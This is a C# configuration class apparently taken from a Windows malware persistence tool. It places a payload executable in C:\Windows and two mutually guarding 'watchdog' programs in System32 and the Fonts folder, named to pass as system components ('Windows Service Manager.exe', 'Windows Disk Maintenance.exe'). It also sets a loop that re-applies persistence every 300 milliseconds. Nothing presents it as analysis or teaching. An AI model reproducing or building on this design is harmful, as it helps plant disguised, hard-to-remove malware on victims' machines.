
public class Config
{
	public static bool Debugging { get; private set; } = true; //Set to true for debugging messages and logs
    public static int sleepTime { get; private set; } = 300; //The time that the loop sleeps in milliseconds between running all persistence. 



    public static string PayloadPath { get; private set; } = @"C:\Windows\"; // This will be created if it doesnt already exist
    public static string PayloadName { get; private set; } = "djwm.exe";
    public static string PayloadFullPath { get; private set; } = Path.Combine(PayloadPath, PayloadName);




    public static string SecondaryWatchdogPath { get; private set; } = @"C:\Windows\System32\"; // This will be created if it doesnt already exist
    public static string SecondaryWatchdogName { get; private set; } = "Windows Disk Maintenance.exe";
    public static string SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDog";
    public static string SecondaryWatchdogFullPath { get; private set; } = Path.Combine(SecondaryWatchdogPath, SecondaryWatchdogName);


    public static string PrimaryWatchdogPath { get; private set; } = @"C:\Windows\Fonts\"; // CRUCIAL: This is the foler you will be put both watchdogs and the payload into
    public static string PrimaryWatchdogName { get; private set; } = "Windows Service Manager.exe";
    public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDog";
    public static string PrimaryWatchdogFullPath { get; private set; } = Path.Combine(PrimaryWatchdogPath, PrimaryWatchdogName);
}


